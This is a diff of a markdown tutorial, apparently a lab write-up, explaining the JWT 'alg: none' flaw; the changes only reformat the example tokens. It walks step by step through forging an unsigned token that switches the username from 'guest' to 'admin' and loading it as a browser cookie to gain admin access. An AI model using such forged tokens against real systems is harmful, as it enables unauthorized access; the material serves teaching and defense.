@@ -6,11 +6,12 @@ A solution is to use integrity-protected tokens like JSON Web Tokens (JWTs). JWT
 
 **Example**
 
-If we take the JWT Token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw"
+If we take the JWT Token:
+    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw"
 
 Decoding this with base64 gives the following:
 
-{"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1665076836}�gx	␃TRډV␄XN␝eƧT
+    {"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1665076836}�gx	␃TRډV␄XN␝eƧT
 
 The token has 3 parts seperated by a '.' character.
 
@@ -25,7 +26,8 @@ In secure JWTs, tampering with the payload or signature will cause a mismatch, p
 
 This vulnerability allowed attackers to modify payload data without generating a valid signature, creating risks like unauthorized access if, for instance, the username in the payload was changed from "guest" to "admin".
 
-*e.g.* We are logged in as "guest" with JWT token **eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzMxMTYzOTY5fQ.dHStDJLdo5WdnHADG75isaLTuHGuDn05q3S4HuuJQIg**
+*e.g.* We are logged in as "guest" with JWT token 
+    **eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzMxMTYzOTY5fQ.dHStDJLdo5WdnHADG75isaLTuHGuDn05q3S4HuuJQIg**
 
 We want to log in as admin.
 
@@ -33,17 +35,21 @@ We want to log in as admin.
 
 **Step 2:** Convert the first part to plaintext, change the alg field to "none" and reconvert it back to base64.
 
-Now we have eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0= as the first part of our string
+Now we have 
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
+as the first part of our string.
 
 **Step 3:** Convert the second part to plaintext and change the value of the username field to be "admin".
 
-Convert it back to base64 and get eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==
+Convert it back to base64 and get 
+    eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==
+as the second part of our string.
 
 **Step 4:** put it back together with a '.' character at the end. 
 
 **N.B. We don't have a signiature but we need the '.' at the end to signify empty signiature.** Our final evil JWT token is the following:
 
-eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==. 
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxMTYzNTc1fQ==. 
 
 Entering this token into the browser (ctrl+shift+i), --> Storage --> Cookies --> hostname --> jwt-session gives us admin access.
 
